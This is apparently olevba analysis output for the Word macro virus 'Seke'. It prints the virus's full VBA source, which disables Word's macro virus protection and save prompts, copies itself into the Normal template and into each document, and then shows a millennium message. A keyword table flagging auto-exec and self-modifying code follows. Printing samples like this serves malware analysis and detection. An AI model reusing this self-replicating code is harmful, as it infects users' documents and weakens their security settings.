olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seke-61086595c1926453cca67b5add9d096457d86699
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Seke-61086595c1926453cca67b5add9d096457d86699 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SEKE.bas 
in file: Virus.MSWord.Seke-61086595c1926453cca67b5add9d096457d86699 - OLE stream: 'Macros/VBA/SEKE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    On Error GoTo salir
    Application.UserAddress = "SEKE - Chiclayo"
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    WordBasic.DisableAutoMacros 0
    If DocuSEKE = 0 Then
        WordBasic.MacroCopy "Global:SEKE", WordBasic.[FileName$]() + ":SEKE"
        ActiveDocument.VBProject.VBComponents.Item(DocuSEKE).CodeModule.ReplaceLine 1, "Sub AutoOpen()"
        If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ElseIf NormalSEKE = 0 Then
        WordBasic.MacroCopy WordBasic.[FileName$]() + ":SEKE", "Global:SEKE"
        NormalTemplate.VBProject.VBComponents.Item(NormalSEKE).CodeModule.ReplaceLine 1, "Sub AutoClose()"
        NormalTemplate.Save
    End If
    If (Day(Now) = 31 And Month(Now) = 12) Or Year(Now) >= 2000 Then
        MsgBox "Te deseo Feliz Año Nuevo " & Application.UserName & " (Año 2000) Nuevo Milenio.", vbExclamation, "SEKE - Chiclayo..."
    End If
salir:
End Sub
Private Function DocuSEKE()
    DocuSEKE = 0
    With ActiveDocument.VBProject.VBComponents
        For i = 2 To .Count
            xx = .Item(i).Name
            If xx = "SEKE" Then
                DocuSEKE = i
                Exit For
            End If
        Next i
    End With
End Function
Private Function NormalSEKE()
    NormalSEKE = 0
    With NormalTemplate.VBProject.VBComponents
        For i = 2 To .Count
            xx = .Item(i).Name
            If xx = "SEKE" Then
                NormalSEKE = i
                Exit For
            End If
        Next i
    End With
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

